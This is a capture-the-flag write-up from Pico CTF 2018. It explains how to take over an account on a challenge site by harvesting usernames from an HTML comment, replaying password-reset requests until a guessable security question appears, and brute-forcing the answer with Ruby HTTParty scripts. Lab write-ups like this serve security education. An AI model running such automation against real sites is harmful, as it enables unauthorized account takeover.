## Challenge

In this challenge, we were given a link to a website and were told that we needed to login to any user to get the flag.

## Discovery

The website was fairly simple. It had a homepage ('/'), a login page ('/login'), and a reset password page ('/reset').
Both the login page and the password reset pages had forms that sent post requests to '/login' and '/reset'.

I started with the login page, attempting sql injection on the username input. However, I quickly realized that I would need
to look elsewhere. I _did_ notice that when I tried a username and password, I got an error message: "Incorrect username or
password"

Next I tried the reset page. The form on this page had only one input: username. When I typed a username into the input, I
got a different error: "User does not exist". Interesting. I tried sql injection here, plus common usernames like admin and
administrator, but was not able to get past the form.

Back on the homepage, I noticed a comment in the HTML that changed on each refresh.

```
<!--Proudly maintained by smalley-->
```

The username was different everytime. I returned to the reset page and tried `smalley`. It worked! Now I could see the
password reset questions. In playing with this process, I realized that the user saw one of a handful of questions each
time they tried to reset a password: What is your favorite color? What is your favorite carmake? Who is your favorite
superhero?

Color seemed to be the easiest to guess. On my first try, I guessed correctly. However, superhero and carmake were a bit
more varied and in my mind, harder to guess. 

Once I got the first question right, I was presented with another random question, which could be the same question I
already answered.

If I answered wrong too many times, the account would lock and I would need to start again with a new username.


## Solution

In an ideal world, I would answer three "What is your favorite color" questions in a row to reset the password. To
do this, I needed to replay the request multiple times, stopping when I got the color question. I started to automate my 
process by sending a GET request to the homepage and grabbing the username from the html response.

```
#### PART 1 GET A NAME

res = HTTParty.get("<url>/")
name = res.match("<!--Proudly maintained by (.*)-->")[1]
```

Next, I sent a POST request to /reset as many times as it took to see the "What is your favorite color?" page.

```
#### Part 2 GET A COOKIE

payload = {
  :username => name
}

options = {
  :body => payload,
  :follow_redirects => true
}

res = nil
until res&.include?("What is you favorite color?")
  res = HTTParty.post("<url>/reset", options)
end

cookie = res.headers['set-cookie'].split(';')[0]
```

I saved the cookie from this page to send along with my next requests to brute force the color.

```
headers = {
  'Cookie' => cookie
}
```

```
#### Part 3 GIVE EM THE COLORS

colors.each do |color|
  payload = {
    :answer => color
  }

  options = {
    :body => payload,
    :headers => headers
  }

  results = HTTParty.post("<url>/reset_q", options)

  if !results.include?('Incorrect answer!')
    cookie = results.headers['set-cookie'].split(';')[0]
    headers = {
      'Cookie' => cookie
    }
    options = {
    	:body => payload,
      :headers => headers
    }
    break
  end
end
```

Once I found the correct color, I saved the cookie from the request to be used in my next replayed POST. I made a loop
to replay the request until I got another color question. I answered with the correct color until I got a page with a link to
change my password.

```
#### Part 4 REPLAY REQUEST

until results.include?('/newpass')
  results = HTTParty.post("<url>/reset_q", options)
  if results.include?('color?') || results.include?('/newpass')
    cookie = results.headers['set-cookie'].split(';')[0]
    headers = {
      'Cookie' => cookie
    }
    options = {
      :body => payload,
      :headers => headers
    }
  end
end
```
Once I reset the password and logged in as the user, I got the flag!

___

Pico CTF 2018 - October 2018
